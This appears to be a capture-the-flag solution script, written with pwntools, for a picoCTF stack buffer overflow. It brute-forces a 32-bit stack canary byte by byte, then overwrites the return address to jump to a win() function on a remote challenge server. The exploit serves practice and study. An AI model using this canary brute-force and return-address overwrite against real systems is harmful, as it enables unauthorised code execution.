#!/usr/bin/python3
from pwn import *
import sys
import string

elf = ELF('vuln')

canary_size = 4
canary = b""

def start():
    return remote("saturn.picoctf.net", 59607)
    #return process(elf.path)

# Below can be used to brute force canary
"""
for i in range(1,5):
    for canary_char in string.printable:
        io = start()
        
        io.sendlineafter(b"> ", b"100")

        offset = b"A"*64
        payload = offset + canary
        payload += canary_char.encode()

        io.recvuntil(b"> ")
        io.send(payload) # Found out it has to be 'send' and not 'sendline' or there will be newline in the canary

        resp = io.recvall()

        if b"Flag" in resp:
            canary += canary_char.encode()
            break
        io.close()

print("Canary:")
print(canary)
"""
# CANARY IS: BiRd
# Since the offset is at 64 we have to put in 64 characters to reach canary start.
# This is a 32 bit binary so canary is 4 bytes. When the first letter of the canary is overwritten
# with the correct letter the program behaves normally. For this reason we can brute force the canary
# one letter at a time, with all printable letters as out input.
io = start()
offset = b"A"*64
padding = b"A"*16
payload = offset + b"BiRd" + padding + p32(0x08049336) # Win() addr
io.sendlineafter(b"> ", b"100")
io.recvuntil(b"> ")
io.send(payload)
io.interactive()
